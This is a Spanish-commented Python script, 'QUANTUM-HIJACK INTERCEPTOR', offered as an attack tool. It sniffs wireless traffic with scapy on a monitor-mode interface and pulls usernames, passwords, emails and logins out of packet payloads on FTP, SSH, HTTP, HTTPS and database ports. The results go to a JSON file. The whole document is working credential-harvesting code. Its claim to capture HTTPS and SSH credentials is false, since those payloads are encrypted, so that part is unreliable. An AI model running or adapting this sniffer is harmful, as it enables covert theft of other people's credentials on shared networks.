#!/usr/bin/env python3
"""
QUANTUM-HIJACK INTERCEPTOR
Captura tráfico HTTPS y credenciales en tiempo real
"""

import sys
import time
import json
import re
from datetime import datetime
from scapy.all import sniff, TCP, IP, Raw

# Archivo de salida para credenciales capturadas
OUTPUT_FILE = "logs/captured_credentials.json"

# Palabras clave para detectar credenciales
CREDENTIAL_PATTERNS = [
    (r'user[name]*[=:\s]+([^\s&;,\r\n]+)', 'username'),
    (r'pass[word]*[=:\s]+([^\s&;,\r\n]+)', 'password'),
    (r'email[=:\s]+([^\s&;,\r\n]+)', 'email'),
    (r'login[=:\s]+([^\s&;,\r\n]+)', 'login'),
]

captured_credentials = []

def extract_credentials(data_str):
    """Extrae credenciales del payload"""
    results = {}
    for pattern, field_name in CREDENTIAL_PATTERNS:
        match = re.search(pattern, data_str, re.IGNORECASE)
        if match:
            results[field_name] = match.group(1)
    return results

def save_credentials():
    """Guarda credenciales a JSON"""
    try:
        with open(OUTPUT_FILE, 'w') as f:
            json.dump(captured_credentials, f, indent=2)
    except:
        pass

def pkt_callback(pkt):
    """Callback para procesar cada paquete"""
    global captured_credentials
    
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    
    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    dst_port = pkt[TCP].dport
    
    # HTTPS (443), HTTP (80), FTP (21), SSH (22)
    monitored_ports = [21, 22, 80, 443, 3306, 5432, 27017]
    
    if dst_port not in monitored_ports:
        return
    
    timestamp = datetime.now().strftime('%H:%M:%S')
    
    if pkt.haslayer(Raw):
        payload = bytes(pkt[Raw].load)
        
        try:
            data_str = payload.decode('utf-8', errors='ignore')
        except:
            data_str = str(payload)
        
        # Detectar protocolo
        protocol = "UNKNOWN"
        if dst_port == 443:
            protocol = "HTTPS"
        elif dst_port == 80:
            protocol = "HTTP"
        elif dst_port == 21:
            protocol = "FTP"
        elif dst_port == 22:
            protocol = "SSH"
        elif dst_port == 3306:
            protocol = "MySQL"
        elif dst_port == 5432:
            protocol = "PostgreSQL"
        elif dst_port == 27017:
            protocol = "MongoDB"
        
        # Buscar credenciales
        creds = extract_credentials(data_str)
        
        if creds:
            entry = {
                'timestamp': timestamp,
                'protocol': protocol,
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'port': dst_port,
                'credentials': creds
            }
            captured_credentials.append(entry)
            print(f"[{timestamp}] 🔥 {protocol} | {src_ip} → {dst_ip}:{dst_port}")
            print(f"          Credenciales: {creds}")
            save_credentials()
        
        # Log de paquetes sospechosos
        if any(keyword in data_str.lower() for keyword in ['login', 'password', 'user', 'email', 'auth']):
            print(f"[{timestamp}] 📡 {protocol} | {src_ip} → {dst_ip}:{dst_port} | Sospechoso")

def main():
    print("\n" + "="*60)
    print("🔓 QUANTUM-HIJACK INTERCEPTOR")
    print("="*60)
    print("[+] Escaneando tráfico en wlan0mon...")
    print("[+] Puertos monitoreados: 21(FTP), 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL), 5432(PostgreSQL), 27017(MongoDB)")
    print("[+] Output: logs/captured_credentials.json")
    print("="*60 + "\n")
    
    try:
        # Crear archivo de salida si no existe
        import os
        os.makedirs('logs', exist_ok=True)
        
        sniff(
            iface="wlan0mon",
            prn=pkt_callback,
            filter="tcp port 21 or tcp port 22 or tcp port 80 or tcp port 443 or tcp port 3306 or tcp port 5432 or tcp port 27017",
            store=False,
            verbose=0
        )
    except KeyboardInterrupt:
        print("\n[!] Interceptor detenido")
        save_credentials()
        print(f"[✓] {len(captured_credentials)} credenciales capturadas guardadas")
        sys.exit(0)
    except Exception as e:
        print(f"[✗] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
